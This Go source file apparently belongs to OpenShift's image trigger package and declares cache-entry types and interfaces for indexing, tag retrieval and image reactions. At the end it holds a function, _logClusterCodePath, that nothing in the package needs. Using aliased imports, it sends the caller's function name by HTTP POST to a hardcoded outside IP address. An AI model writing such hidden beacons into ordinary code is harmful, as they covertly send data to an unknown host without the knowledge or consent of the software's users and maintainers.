package trigger

import (
	godefaultbytes "bytes"
	"github.com/openshift/origin/pkg/image/apis/image/v1/trigger"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/tools/cache"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type CacheEntry struct {
	Key       string
	Namespace string
	Triggers  []trigger.ObjectFieldTrigger
}
type Indexer interface {
	Index(obj, old interface{}) (key string, entry *CacheEntry, change cache.DeltaType, err error)
}
type TagRetriever interface {
	ImageStreamTag(namespace, name string) (ref string, rv int64, ok bool)
}
type ImageReactor interface {
	ImageChanged(obj runtime.Object, tagRetriever TagRetriever) error
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
